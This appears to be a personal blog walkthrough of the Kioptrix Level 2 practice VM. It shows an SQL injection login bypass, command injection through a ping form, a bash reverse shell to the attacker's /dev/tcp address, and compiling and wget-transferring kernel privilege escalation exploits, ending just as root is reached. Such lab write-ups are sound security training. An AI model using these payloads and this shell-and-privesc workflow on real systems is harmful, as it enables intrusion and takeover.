# Overview:

This was a fun but challenging box to work through, with initial access gained through basic SQL enabled Command Injection, and the compilation of an exploit to pop the root shell. A lot of trial and error, but that just made it all the more satisfying at the end!

# Enumeration
As always, start with an nmap scan to identify listening ports and services:

```
nmap -sS -sV -vv -Pn -oA /home/montana/Documents/Kioptrix_2/allscan 192.168.58.134
```

Providing us with this:
```

# Exploitation

Web pages are usually a good starting point, and here we find the Remote System Admin Login form:
![LoginForm](https://opalsec.github.io/assets/images/Kioptrix2/LoginForm.png)

## SQL Injection
An obvious first thing to try (doesn't often work in the wild) is to perform SQL Injection:
![SQLi](https://opalsec.github.io/assets/images/Kioptrix2/SQLi.png)

This is the most basic of SQL Injections you can do - we're effectively guessing the syntax of the query that would be run on the SQL server in the back-end, modifying it to include an OR statement that evaluates to TRUE, while also commenting out any following code with the `#` symbol

e.g.

>**Original Query:** "SELECT * FROM user WHERE username = '$username' AND password = '$password'";

>**Modified Query:** "SELECT * FROM user WHERE username = '' OR 1=1#

The modified query would return us everything from the *user* table where a username evaluates to TRUE. In this case, the SQL Injection attempt authenticates us with the web server.

![Pingit.png](https://opalsec.github.io/assets/images/Kioptrix2/Pingit.png)

We're presented with a web page that allows us to invoke a ping command originating from the vulnerable machine. At first glance, it doesn't seem like it'd be useful at all, but in fact, we can leverage a Remote Command Injection vulnerability in this web form:

## Remote Command Injection

In this case, we can verify a Remote Code Injection opportunity by following your input with a system command - i.e. chasing valid input with another command

```
$> 127.0.0.1; whoami

	PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
	64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.011 ms

	apache
```

# Getting an Unprivileged Shell
We can abuse this RCI to get a bash terminal - forwarding a bash terminal through dev\tcp to the attacker, redirecting stdin to std out (0>&1) i.e. forward what comes in from the connection with 192.168.123.128:443 to std out on the terminal on the victim
`$>Â 127.0.0.1; bash -i >& /dev/tcp/192.168.123.128/443 0>&1`

Catch it by using netcat on the attacking end:
```
root@Cortana:/home/montana/Documents/Kioptrix_2# nc -nvlp 443
	listening on [any] 443 ...
```

And we have our shell:
```
	connect to [192.168.123.128] from (UNKNOWN) [192.168.123.130] 32769
	bash: no job control in this shell
	bash-3.00$ whoami
	apache
```

# Privilege Escalation

From here we need to find a way to get ourselves root privileges. This VM is running on an old version of Linux, so I want to identify the specific distro and kernel version it's running.

The command `lsb_release -a` prints information on the Linux Standard Base of the host machine:
```
bash-3.00$ lsb_release -a
	LSB Version:    :core-3.0-ia32:core-3.0-noarch:graphics-3.0-ia32:graphics-3.0-noarch
	Distributor ID: CentOS
	Description:    CentOS release 4.5 (Final)
	Release:        4.5
	Codename:       Final
```

And we can also verify the kernel version by running uname -a
```
bash-3.00# uname -a
	Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 athlon i386 GNU/Linux
```

## Privesc Attempt #1: 9542.c

Using Searchsploit, we can look for existing exploits for our victim's specific distro:
```
root@Cortana:/home/montana/Documents/Kioptrix_2# searchsploit CentOS 4.5
	-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
	 Exploit Title                                                                                                                                                            |  Path

	-------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

I copy the exploit code to the working folder, and compile it with gcc:
```
root@Cortana:/home/montana/Documents/Kioptrix_2# searchsploit -m 9542
  Exploit: Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1)                                                                   
      URL: https://www.exploit-db.com/exploits/9542/
     Path: /usr/share/exploitdb/exploits/linux_x86/local/9542.c
File Type: C source, ASCII text, with CRLF line terminators

Copied to: /home/montana/Documents/Kioptrix_2/9542.c

root@Cortana:/home/montana/Documents/Kioptrix_2# gcc -o exploit 9542.c
9542.c:109:28: warning: no newline at end of file
```

### Compiling and transferring the exploit
As I'm compiling the exploit locally, I use Python's Simple HTTP Server to serve-up and retrieve the exploit to the victim machine:

Start the server in the directory with the exploit on the attacking computer:
```
root@Cortana:/home/montana/Documents/Kioptrix_2# python -m SimpleHTTPServer
```

On the victim, cd to /tmp so we can write the file to disk; retrieve it from the attacker, and make it executable:
```
bash-3.00# cd /tmp
bash-3.00# wget 192.168.123.128:8000/exploit
bash-3.00# chmod 755 exploit
```

### Face, meet Palm
Unfortunately when I first try to run the exploit, I get this error:
```
bash-3.00$ ./exploit
bash: ./exploit: cannot execute binary file
```

A quick Google reminds me that I needed to run gcc with the -m32 flag to compile it as a 32-bit binary so it'd run on the 32-bit victim machine. Re-running it, I get a different error:

```
bash-3.00$ ./exploit
bash: [3486: 4] tcsetattr: Invalid argument 
```

> Comment: Get used to having to compiling, editing, and re-running exploits multiple times before they work - unfortunately if they're not in Metasploit, they'll probably need some tweaking before/if they work.

A good samaritan on Reddit offered the following advice: 

![gccCompile.png](https://opalsec.github.io/assets/images/Kioptrix2/gccCompile.png)

Keen to understand what those added flags did, I did a little extra research:
>**-m32** enables compilation of 32 bit objects on a compiler configured to compile 64 bit objects by default

>**-Wl** passes a comma-separated list of tokens as a space-separated list of arguments to the linker, e.g. -Wl,aaa,bbb,ccc is read by the linker as ld aaa bbb ccc

>**--hash-style=both** compiles the binary using both gnu and sysv hashtables, which are used for runtime symbol resolution. Shouldn't matter unless the compiled binary is being run on a system with a dynamic linker which doesn't understand GNU hashtables.

Queue Error #3:

![gccError3.png](https://opalsec.github.io/assets/images/Kioptrix2/gccError3.png)

The solution was to install gcc-multilib and g++-multilib before re-compiling:

`apt install gcc-multilib -y && apt install g++=multilib -y`

Running it once again, it looks like I've hit a dead-end. Re-running it several times didn't produce different results:
```
bash-3.00$ ./exploit
[-] exploit failed, try again 
```

## Privesc Attempt #2: 9545.c

Since there was no further information I could use to debug it, I tried to find another one based on the kernel version since it was so old (2.6)
```
root@Cortana:/home/montana/Documents/Kioptrix_2# searchsploit linux kernel | grep 2.6 | grep CentOS
Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE  | exploits/linux/local/9545.c
Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedor | exploits/linux_x86/local/9542.c
Linux Kernel 2.6.32 < 3.x (CentOS 5/6) - 'PERF_EVENTS' Local Pr | exploits/linux/local/25444.c
Linux Kernel 2.6.x / 3.10.x / 4.14.x (RedHat / Debian / CentOS) | exploits/linux/local/45516.c
```

The usual compile of gcc 9545.c didn't work, so I used the same method for the previous exploit:
`root@Cortana:/home/montana/Documents/Kioptrix_2# gcc -m32 -Wl,--hash-style=both 9545.c -o exploit`

Finally, we have root:
